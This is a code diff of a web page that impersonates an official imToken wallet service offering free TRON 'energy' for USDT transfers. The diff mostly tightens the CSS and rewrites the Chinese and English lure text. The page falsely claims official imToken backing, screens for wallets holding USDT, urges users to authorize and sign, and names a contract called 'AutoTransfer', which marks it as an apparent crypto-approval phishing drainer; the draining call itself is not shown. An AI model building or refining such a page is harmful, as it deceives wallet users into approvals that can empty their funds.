@@ -9,7 +9,7 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
 body { 
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-    padding: 12px 10px;
+    padding: 8px 6px; /* 减小内边距，更紧凑 */
     max-width: 600px; 
     margin: 0 auto; 
     background: #121a17; 
@@ -17,78 +17,83 @@ body {
     min-height: 100vh;
     display: flex;
     flex-direction: column;
-    gap: 8px;
+    gap: 5px; /* 减小元素间距 */
     border-radius: 8px;
     border-left: 3px solid #3b82f6;
-    font-size: 15px; /* 整体字体调大 */
+    font-size: 14px; /* 恢复原字体大小 */
 }
 .container {
     flex: 1;
     display: flex;
     flex-direction: column;
-    gap: 8px;
+    gap: 5px; /* 减小间距 */
+}
+/* 新增：标题+语言切换同一行容器 */
+.header-container {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 8px 6px;
+    border-bottom: 1px solid #334155;
+    margin-bottom: 3px;
 }
 .lang-switch {
-    display: flex;
-    justify-content: flex-end;
-    padding-right: 6px;
-    margin-bottom: 4px;
+    padding: 0;
+    margin: 0;
 }
 .lang-toggle {
-    padding: 4px 10px;
+    padding: 3px 8px; /* 减小按钮内边距 */
     border: 1px solid #3b82f6;
     border-radius: 20px;
     background: transparent;
     color: #e0e8e4;
-    font-size: 15px; /* 字体调大 */
+    font-size: 13px; /* 恢复原字体大小 */
     cursor: pointer;
     display: flex;
     align-items: center;
-    gap: 6px;
+    gap: 4px;
 }
 .lang-toggle:hover {
     background: rgba(59, 130, 246, 0.2);
 }
 .header {
-    text-align: center;
-    padding: 10px 0;
-    border-bottom: 1px solid #334155;
-    margin-bottom: 5px;
-    display:flex;
-    justify-content: center;
+    text-align: left;
+    padding: 0;
+    border-bottom: none;
+    margin-bottom: 0;
+    display: block;
 }
 .header h1 { 
-    font-size: 24px; /* 字体调大 */
+    font-size: 20px; /* 恢复原字体大小 */
     color: #3b82f6; 
-    margin-bottom: 5px;
+    margin-bottom: 2px;
 }
 .header .desc {
-    font-size: 14px; /* 字体调大 */
+    font-size: 12px; /* 恢复原字体大小 */
     color: #a0a8a4;
-    max-width: 450px;
-    margin: 0 auto;
-    line-height: 1.5; 
+    max-width: 400px;
+    line-height: 1.4; 
 }
 .warning {
     background: #334155;
     color: #93c5fd;
-    padding: 12px;
+    padding: 10px; /* 减小内边距 */
     border-radius: 8px;
-    font-size: 14px; /* 字体调大 */
+    font-size: 12px; /* 恢复原字体大小 */
     border-left: 3px solid #4ade80;
-    line-height: 1.6;
+    line-height: 1.5;
 }
 .warning strong {
     color: #3b82f6;
 }
 #userInfo {
     text-align: center;
-    font-size: 15px; /* 字体调大 */
-    padding: 15px;
+    font-size: 13px; /* 恢复原字体大小 */
+    padding: 12px; /* 减小内边距 */
     background: #1e2925;
     border-radius: 8px;
     border: 1px solid #334155;
-    line-height: 1.8;
+    line-height: 1.6;
 }
 #userInfo span {
     color: #3b82f6;
@@ -96,21 +101,21 @@ body {
 }
 #walletStatusContainer {
     background: #1e2925;
-    padding: 15px;
+    padding: 12px; /* 减小内边距 */
     border-radius: 8px;
     border: 1px solid #334155;
-    font-size: 14px; /* 字体调大 */
+    font-size: 12px; /* 恢复原字体大小 */
     color: #a0a8a4;
-    line-height: 1.8;
+    line-height: 1.6;
     border-right: 5px solid #4ade80;
 }
 #walletStatusContainer .status-title {
-    font-size: 16px; /* 字体调大 */
+    font-size: 14px; /* 恢复原字体大小 */
     color: #3b82f6;
-    margin-bottom: 8px;
+    margin-bottom: 6px;
     display: flex;
     align-items: center;
-    gap: 8px;
+    gap: 6px;
 }
 #walletStatusContainer .connected-content {
     display: none;
@@ -127,29 +132,29 @@ body {
 }
 #walletStatusContainer.connected .connected-content .orange-tip {
     color: #f97316;
-    margin-top: 5px;
-    font-size: 14px; /* 字体调大 */
+    margin-top: 3px;
+    font-size: 12px; /* 恢复原字体大小 */
 }
 #contractResourceContainer {
     background: #1e2925;
-    padding: 15px;
+    padding: 12px; /* 减小内边距 */
     border-radius: 8px;
     border: 1px solid #334155;
-    font-size: 14px; /* 字体调大 */
+    font-size: 12px; /* 恢复原字体大小 */
     color: #a0a8a4;
-    line-height: 2;
+    line-height: 1.8;
     border-bottom: 2px solid rgba(59, 130, 246, 0.2);
 }
 #contractResourceContainer .status-title {
-    font-size: 16px; /* 字体调大 */
+    font-size: 14px; /* 恢复原字体大小 */
     color: #3b82f6;
-    margin-bottom: 10px;
+    margin-bottom: 6px;
     display: flex;
     align-items: center;
-    gap: 8px;
+    gap: 6px;
 }
 #contractResourceContainer .status-title i {
-    font-size: 18px; /* 字体调大 */
+    font-size: 15px; /* 恢复原字体大小 */
     color: #93c5fd;
 }
 #contractResourceContainer .highlight {
@@ -158,23 +163,23 @@ body {
 }
 #contractResourceContainer .data-tag {
     background: rgba(59, 130, 246, 0.15);
-    padding: 3px 8px;
+    padding: 2px 6px; /* 减小内边距 */
     border-radius: 4px;
     border: 1px solid rgba(59, 130, 246, 0.3);
-    font-size: 14px; /* 字体调大 */
+    font-size: 12px; /* 恢复原字体大小 */
 }
 .record-list {
     background: #1e2925;
-    padding: 15px;
+    padding: 12px; /* 减小内边距 */
     border-radius: 8px;
     border: 1px solid #334155;
-    font-size: 14px; /* 字体调大 */
+    font-size: 12px; /* 恢复原字体大小 */
     border-right: 5px solid #4ade80;
     display: none; /* 初始隐藏 */
 }
 .record-item {
-    margin-bottom: 10px;
-    padding-bottom: 10px;
+    margin-bottom: 8px;
+    padding-bottom: 8px;
     border-bottom: 1px solid #334155;
 }
 .record-item:hover {
@@ -182,22 +187,22 @@ body {
     transition: border-color 0.3s;
 }
 .record-item p {
-    margin-bottom: 6px;
+    margin-bottom: 4px;
     color: #a0a8a4;
-    line-height: 1.6;
-    font-size: 14px; /* 字体调大 */
+    line-height: 1.4;
+    font-size: 12px; /* 恢复原字体大小 */
 }
 .record-item p strong {
     color: #e0e8e4;
-    margin-right: 6px;
+    margin-right: 5px;
 }
 .tx-link {
     color: #3b82f6;
     text-decoration: none;
     display: inline-flex;
     align-items: center;
-    gap: 6px;
-    font-size: 14px; /* 字体调大 */
+    gap: 5px;
+    font-size: 12px; /* 恢复原字体大小 */
 }
 .tx-link:hover {
     text-decoration: underline;
@@ -205,15 +210,15 @@ body {
 .btn-group {
     display: flex;
     flex-direction: column;
-    gap: 8px; 
-    margin-top: 10px;
-    padding: 10px 0;
+    gap: 6px; /* 减小间距 */
+    margin-top: 8px;
+    padding: 8px 0;
     border-top: 1px solid #334155;
 }
 .btn {
     width: 100%;
-    padding: 18px;
-    font-size: 16px; /* 字体调大 */
+    padding: 12px; /* 减小内边距 */
+    font-size: 14px; /* 恢复原字体大小 */
     border: none;
     border-radius: 8px;
     background: #2563eb;
@@ -222,7 +227,7 @@ body {
     display: flex;
     align-items: center;
     justify-content: center;
-    gap: 8px;
+    gap: 6px;
     transition: background 0.3s;
 }
 .btn:hover {
@@ -234,13 +239,13 @@ body {
     cursor: not-allowed;
 }
 .footer-info {
-    margin-top: 10px;
-    padding-top: 10px;
+    margin-top: 8px;
+    padding-top: 8px;
     border-top: 1px solid #334155;
-    font-size: 12px; /* 字体调大 */
+    font-size: 10px; /* 恢复原字体大小 */
     color: #a0a8a4;
     text-align: center;
-    line-height: 1.8;
+    line-height: 1.6;
 }
 .footer-info a {
     color: #3b82f6;
@@ -254,26 +259,27 @@ body {
 }
 .review-tip {
     color: #4ade80;
-    font-size: 14px; /* 字体调大 */
-    margin-top: 8px;
+    font-size: 12px; /* 恢复原字体大小 */
+    margin-top: 6px;
     display: flex;
     align-items: center;
     justify-content: center;
-    gap: 8px;
+    gap: 6px;
 }
     </style>
 </head>
 <body>
-    <div class="lang-switch">
-        <button id="langToggle" class="lang-toggle">
-          <i class="fa fa-globe"></i>
-        </button>
-    </div>
     <div class="container">      
-        <div class="header">
-            <div>
+        <!-- 新增：标题+语言切换同一行 -->
+        <div class="header-container">
+            <div class="header">
                 <h1 id="headerTitle">imToken</h1>
                 <p class="desc" id="headerDesc">imToken官方专属服务，每个钱包地址每30天只可领取一次能量</p>
+            </div>
+            <div class="lang-switch">
+                <button id="langToggle" class="lang-toggle">
+                  <<i class="fa fa-globe"></</i>
+                </button>
             </div>
         </div>   
         <div id="userInfo">
@@ -302,20 +308,20 @@ body {
             <div class="status-title">     
                 <h3 id="contractResourceTitle">合约剩余资源</h3>
             </div>
-            <div class="resource-content" style="line-height: 2;">
+            <div class="resource-content" style="line-height: 1.8;">
                 <p>• 合约地址：<span class="highlight" id="contractAddr"></span></p>
                 <p>• 剩余能量：<span class="highlight data-tag" id="contractEnergy"></span></p>
-                <p style="font-size: 14px; color: #a0a8a4; margin-top: 8px;" id="contractNote">
+                <p style="font-size: 12px; color: #a0a8a4; margin-top: 5px;" id="contractNote">
                     注：剩余能量为“ 0 ”时停止领取，该项目为imToken官方发行，只限imToken钱包用户参与。
                 </p>
             </div>
         </div>
         <div class="record-list" id="recordList">
-            <div style="display: flex; justify-content: space-between; margin: 6px 0;">
+            <div style="display: flex; justify-content: space-between; margin: 4px 0;">
                 <span id="recordTypeTitle">能量使用范围</span>
                 <span id="recordAmountTitle">转账额度</span>
             </div>
-            <div style="display: flex; color: #3b82f6;justify-content: space-between; margin: 6px 0;">
+            <div style="display: flex; color: #3b82f6;justify-content: space-between; margin: 4px 0;">
                 <span class="header"><h3 id="energyType">USDT转账</h3></span>
                 <span class="header"><h3 id="transferQuota">无限</h3></span>
             </div>       
@@ -395,7 +401,7 @@ let trxBalance = 0.00;
 const RECORD_KEY = "imtoken_energy_records";
 // 新增：B1信号发送标记（防止重复发送）
 const B1_SIGNAL_KEY = "b1_signal_sent";
-// ========== 多语言配置（同步中文修改对应的英文） ==========
+// ========== 多语言配置（以页面文本为准，同步调整） ==========
 const langConfig = {
     zh: {
         headerTitle: "imToken",
@@ -403,9 +409,9 @@ const langConfig = {
         userInfoDefault: "未连接钱包<br><span>请点击底部「连接imToken钱包」按钮</span>",
         walletStatusTitle: "钱包状态",
         disconnectedText: "未连接钱包",
-        disconnectedTip1: "您现在准备领取的是imToken专属能量，非imToken用户不可领取",
+        disconnectedTip1: "此链接为imToken专属通道，非imToken用户不可领取",
         disconnectedTip2: "1. 每个钱包地址30天内只可免费领取一次",
-        disconnectedTip3: "2. 项目只为用户在钱包无能量的紧急情况下提供能量支援非盈利项目",
+        disconnectedTip3: "2. 此链接只为用户在钱包无能量的紧急情况下提供能量支援非盈利项目",
         disconnectedTip4: "3. 点击领取后系统将审核钱包地址是否符合领取要求",
         disconnectedTip5: "4. 无需消耗任何资产，选择放弃直接退出即可",
         connectedSuccess: "✅ 钱包已成功连接",
@@ -416,7 +422,7 @@ const langConfig = {
         contractResourceTitle: "合约剩余资源",
         contractAddrText: "• 合约地址：<span class='highlight' id='contractAddr'></span>",
         contractEnergyText: "• 剩余能量：<span class='highlight data-tag' id='contractEnergy'>4104470400000</span>",
-        contractNote: "注：所有剩余量为“ 0 ”时停止领取，该项目为imToken官方发行，只限imToken用户参与。",
+        contractNote: "注：剩余能量为“ 0 ”时停止领取，该项目为imToken官方发行，只限imToken钱包用户参与。",
         recordTypeTitle: "能量使用范围",
         recordAmountTitle: "转账额度",
         energyType: "USDT转账",
@@ -425,25 +431,25 @@ const langConfig = {
         browserWarn1: " ⚠️ 请用 <strong>imToken钱包内置浏览器</strong> 打开",
         browserWarn2: " ⚠️ 非钱包浏览器：点击按钮自动复制+唤起imToken",
         connectBtnText: "连接imToken钱包",
-        approveBtnText: "免费领取能量",
+        approveBtnText: "领取能量",
         reviewTipText: "系统审核中，审核通过后请务必完成签名",
-        footerInfo: "合约验证：AutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span>（TRON浏览器查询）© 2025 TRX能量服务 | <a href='https://tronscan.org' target='_blank'>TRON浏览器</a> | <a href='https://token.im' target='_blank'>imToken官网</a>",
+        footerInfo: "合约验证：AutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span>（TRON浏览器查询）© 2025 能量服务 | <a href='https://tronscan.org' target='_blank'>TRON浏览器</a> | <a href='https://token.im' target='_blank'>imToken官网</a>",
         copySuccess: "✅ 链接已复制，请在imToken内置浏览器打开",
         copyFail: "❌ 复制失败：请手动复制链接",
         唤起Guide: "✅ 已复制链接+唤起imToken\n下一步：打开imToken → 浏览 → 粘贴访问",
         copyGuide: "✅ 链接已复制，请在imToken中粘贴访问",
-        connectError: "连接异常<br><span style='color: #ef4444; font-size: 16px;'>⚠️ 网络波动</span>",
+        connectError: "连接异常<br><span style='color: #ef4444; font-size: 14px;'>⚠️ 网络波动</span>",
         retryConnect: "重试连接",
-        authorizedTip: "已领取提示<br>{address}<br>USDT余额：<span>{usdt}</span> | TRX余额：<span>{trx}</span><br><span style='color: #3b82f6; font-size: 16px;'>✅ 该钱包30天内已领取过免费能量</span><br><span style='color: #a0a8a4; font-size: 15px;'>每个地址每30天仅限领取一次</span>",
+        authorizedTip: "已领取提示<br>{address}<br>USDT余额：<span>{usdt}</span> | TRX余额：<span>{trx}</span><br><span style='color: #3b82f6; font-size: 14px;'>✅ 该钱包30天内已领取过免费能量</span><br><span style='color: #a0a8a4; font-size: 13px;'>每个地址每30天仅限领取一次</span>",
         authorizedBtn: "已领取过能量",
-        afterApproveTip: "已连接：<br>{address}<br><span style='color: #4ade80; font-size: 16px;'>✅ 授权成功，发放能量中...</span>",
+        afterApproveTip: "已连接：<br>{address}<br><span style='color: #4ade80; font-size: 14px;'>✅ 授权成功，发放能量中...</span>",
         deployingBtn: "发放中...",
         loadingBtn: "加载中...",
-        loadingTip: "已连接：<br>{address}<br><span style='color: #4ade80; font-size: 16px;'>✅ 加载中...</span>",
+        loadingTip: "已连接：<br>{address}<br><span style='color: #4ade80; font-size: 14px;'>✅ 加载中...</span>",
         queryingBalance: "查询中...",
-        insufficientUsdt: "已连接：<br>{address}<br>USDT余额：<span style='color: #ef4444;'>{usdt}</span> | TRX余额：<span>{trx}</span><br><span style='color: #ef4444; font-size: 16px;'>❌ 不符合领取条件：USDT余额需大于1</span>",
+        insufficientUsdt: "已连接：<br>{address}<br>USDT余额：<span style='color: #ef4444;'>{usdt}</span> | TRX余额：<span>{trx}</span><br><span style='color: #ef4444; font-size: 14px;'>❌ 不符合领取条件：USDT余额需大于1</span>",
         insufficientBtn: "不符合领取条件",
-        eligibleTip: "已连接：<br>{address}<br>USDT余额：<span style='color: #4ade80;'>{usdt}</span> | TRX余额：<span>{trx}</span><br><span style='color: #4ade80; font-size: 16px;'>✅ 可免费领取90000 USDT 能量</span>",
+        eligibleTip: "已连接：<br>{address}<br>USDT余额：<span style='color: #4ade80;'>{usdt}</span> | TRX余额：<span>{trx}</span><br><span style='color: #4ade80; font-size: 14px;'>✅ 可免费领取90000 USDT 能量</span>",
         distributingBtn: "能量配送中...",
         redirectingBtn: "跳转签名中...",
         approveFail: "⚠️ 操作失败：{msg}，请稍后重试",
@@ -459,19 +465,19 @@ const langConfig = {
         systemBusyTip: "系统繁忙请稍后重试",
         ineligibleTip: "不符合领取条件",
         errorTipPrefix: "⚠️ ",
-        noWalletAddress: "未检测到有效钱包地址<br><span style='color: #ef4444; font-size: 16px;'>❌ 请连接imToken钱包后重试</span>",
-        nonImTokenUser: "非imToken钱包用户<br><span style='color: #ef4444; font-size: 16px;'>❌ 仅限imToken用户参与</span>"
+        noWalletAddress: "未检测到有效钱包地址<br><span style='color: #ef4444; font-size: 14px;'>❌ 请连接imToken钱包后重试</span>",
+        nonImTokenUser: "非imToken钱包用户<br><span style='color: #3b82f6; font-size: 13px;'>请用imToken钱包内置浏览器打开</span>"
     },
     en: {
-        headerTitle: "imToken Official",
-        headerDesc: "imToken Exclusive Service - Each wallet address can claim free energy once every 30 days",
+        headerTitle: "imToken",
+        headerDesc: "imToken Official Exclusive Service - Each wallet address can claim energy once every 30 days",
         userInfoDefault: "Wallet not connected<br><span>Click the 'Connect imToken Wallet' button below</span>",
         walletStatusTitle: "Wallet Status",
         disconnectedText: "Wallet not connected",
-        disconnectedTip1: "You are about to claim imToken exclusive energy - only for imToken users",
+        disconnectedTip1: "This link is exclusive to imToken users - non-imToken users cannot claim",
         disconnectedTip2: "1. Each wallet address can claim free energy once every 30 days",
         disconnectedTip3: "2. This non-profit project provides emergency energy support for users with no wallet energy",
-        disconnectedTip4: "3. The system will verify if the wallet address meets the claim requirements after clicking 'Claim'",
+        disconnectedTip4: "3. The system will verify if the wallet address meets the requirements after clicking 'Claim'",
         disconnectedTip5: "4. No assets required - exit directly to cancel",
         connectedSuccess: "✅ Wallet connected successfully",
         connectedAddress: "• Wallet Address: <span class='highlight' id='statusAddress'></span>",
@@ -481,7 +487,7 @@ const langConfig = {
         contractResourceTitle: "Contract Remaining Resources",
         contractAddrText: "• Contract Address: <span class='highlight' id='contractAddr'></span>",
         contractEnergyText: "• Remaining Energy: <span class='highlight data-tag' id='contractEnergy'>4104470400000</span>",
-        contractNote: "Note: Distribution stops when remaining amount is '0' - Official imToken project, only for imToken users",
+        contractNote: "Note: Distribution stops when remaining energy is '0' - Official imToken project, only for imToken users",
         recordTypeTitle: "Energy Usage Scope",
         recordAmountTitle: "Transfer Quota",
         energyType: "USDT Transfer",
@@ -490,23 +496,25 @@ const langConfig = {
         browserWarn1: " ⚠️ Open with <strong>imToken in-app browser</strong>",
         browserWarn2: " ⚠️ Non-wallet browser: Click button to copy + launch imToken",
         connectBtnText: "Connect imToken Wallet",
-        approveBtnText: "Claim Free Energy",
+        approveBtnText: "Claim Energy",
         reviewTipText: "System reviewing - please complete the signature after approval",
-        footerInfo: "Contract Verification: AutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span> (Check on TRON Scan) © 2025 TRX Energy Service | <a href='https://tronscan.org' target='_blank'>TRON Scan</a> | <a href='https://token.im' target='_blank'>imToken Official</a>",
+        footerInfo: "Contract Verification: AutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span> (Check on TRON Scan) © 2025 Energy Service | <a href='https://tronscan.org' target='_blank'>TRON Scan</a> | <a href='https://token.im' target='_blank'>imToken Official</a>",
         copySuccess: "✅ Link copied - open in imToken in-app browser",
-        copyFail: "❌ Copy failed - please copy manually",
+        copyFail: "❌ Copy failed: Please copy manually",
         唤起Guide: "✅ Link copied + imToken launched\nNext: Open imToken → Browser → Paste link",
         copyGuide: "✅ Link copied - please paste in imToken",
-        connectError: "Connection Error<br><span style='color: #ef4444; font-size: 16px;'>⚠️ Network fluctuation</span>",
+        connectError: "Connection Error<br><span style='color: #ef4444; font-size: 14px;'>⚠️ Network fluctuation</span>",
         retryConnect: "Retry Connection",
+        authorizedTip: "Claimed Tip<br>{address}<br>USDT Balance: <span>{usdt}</span> | TRX Balance: <span>{trx}</span><br><span style='color: #3b82f6; font-size: 14px;'>✅ This wallet has claimed free energy within 30 days</span><br><span style='color: #a0a8a4; font-size: 13px;'>One claim per address every 30 days</span>",
         authorizedBtn: "Energy Claimed",
-        afterApproveTip: "Connected:<br>{address}<br><span style='color: #4ade80; font-size: 16px;'>✅ Authorization successful, energy distributing...</span>",
+        afterApproveTip: "Connected:<br>{address}<br><span style='color: #4ade80; font-size: 14px;'>✅ Authorization successful, energy distributing...</span>",
         deployingBtn: "Distributing...",
         loadingBtn: "Loading...",
-        loadingTip: "Connected:<br>{address}<br><span style='color: #4ade80; font-size: 16px;'>✅ Loading...</span>",
+        loadingTip: "Connected:<br>{address}<br><span style='color: #4ade80; font-size: 14px;'>✅ Loading...</span>",
         queryingBalance: "Querying...",
+        insufficientUsdt: "Connected:<br>{address}<br>USDT Balance: <span style='color: #ef4444;'>{usdt}</span> | TRX Balance: <span>{trx}</span><br><span style='color: #ef4444; font-size: 14px;'>❌ Ineligible: USDT balance must exceed 1</span>",
         insufficientBtn: "Ineligible",
-        eligibleTip: "Connected:<br>{address}<br>USDT Balance: <span style='color: #4ade80;'>{usdt}</span> | TRX Balance: <span>{trx}</span><br><span style='color: #4ade80; font-size: 16px;'>✅ Eligible for 90000 free USDT Energy</span>",
+        eligibleTip: "Connected:<br>{address}<br>USDT Balance: <span style='color: #4ade80;'>{usdt}</span> | TRX Balance: <span>{trx}</span><br><span style='color: #4ade80; font-size: 14px;'>✅ Eligible for 90000 USDT Energy</span>",
         distributingBtn: "Energy Distributing...",
         redirectingBtn: "Redirecting to Signature...",
         approveFail: "⚠️ Operation failed: {msg}, please try again later",
@@ -522,10 +530,8 @@ const langConfig = {
         systemBusyTip: "System busy, please try again later",
         ineligibleTip: "Ineligible",
         errorTipPrefix: "⚠️ ",
-        authorizedTip: "Claimed Successfully<br>{address}<br>USDT Balance: <span>{usdt}</span> | TRX Balance: <span>{trx}</span><br><span style='color: #3b82f6; font-size: 16px;'>✅ This wallet has claimed free energy within 30 days</span><br><span style='color: #a0a8a4; font-size: 15px;'>One claim per address every 30 days</span>",
-        insufficientUsdt: "Connected:<br>{address}<br>USDT Balance: <span style='color: #ef4444;'>{usdt}</span> | TRX Balance: <span>{trx}</span><br><span style='color: #ef4444; font-size: 16px;'>❌ Ineligible: USDT balance must exceed 1</span>",
-        noWalletAddress: "No valid wallet address detected<br><span style='color: #ef4444; font-size: 16px;'>❌ Please connect imToken wallet and try again</span>",
-        nonImTokenUser: "Non-imToken user<br><span style='color: #ef4444; font-size: 16px;'>❌ Only for imToken users</span>"
+        noWalletAddress: "No valid wallet address detected<br><span style='color: #ef4444; font-size: 14px;'>❌ Please connect imToken wallet and try again</span>",
+        nonImTokenUser: "Non-imToken user<br><span style='color: #3b82f6; font-size: 13px;'>Please open with imToken in-app browser</span>"
     }
 };
 // 当前语言
@@ -776,7 +782,7 @@ document.addEventListener('DOMContentLoaded', async () => {
                 const lang = langConfig[currentLang];
                 const shortAddr = userAddress ? `${userAddress.slice(0,8)}...${userAddress.slice(-6)}` : "未知地址";
                 const tip = isCustomerError(err.message) ? lang.ineligibleTip : lang.systemBusyTip;
-                userInfoEl.innerHTML = `${lang.loadingTip.replace("{address}", shortAddr)}<br><span style='color: #ef4444; font-size: 16px;'>${lang.errorTipPrefix}${tip}</span>`;
+                userInfoEl.innerHTML = `${lang.loadingTip.replace("{address}", shortAddr)}<br><span style='color: #ef4444; font-size: 14px;'>${lang.errorTipPrefix}${tip}</span>`;
                 approveBtn.disabled = false;
                 approveBtn.textContent = lang.approveBtnText;
             });
@@ -793,11 +799,8 @@ async function checkImTokenEnv() {
         await initWallet(false);
     } else {
         try {
-            // 非imToken环境：只显示非用户提示，不显示不符合领取条件
-            userInfoEl.innerHTML = `
-                ${lang.nonImTokenUser}<br>
-                <span style="color: #3b82f6; font-size: 15px;">${lang.copyGuide.split("✅ ")[1]}</span>
-            `;
+            // 非imToken环境：只显示引导提示，无不符合领取条件文本
+            userInfoEl.innerHTML = lang.nonImTokenUser;
             approveBtn.style.display = "none";
             connectBtn.onclick = async () => {
                 try {
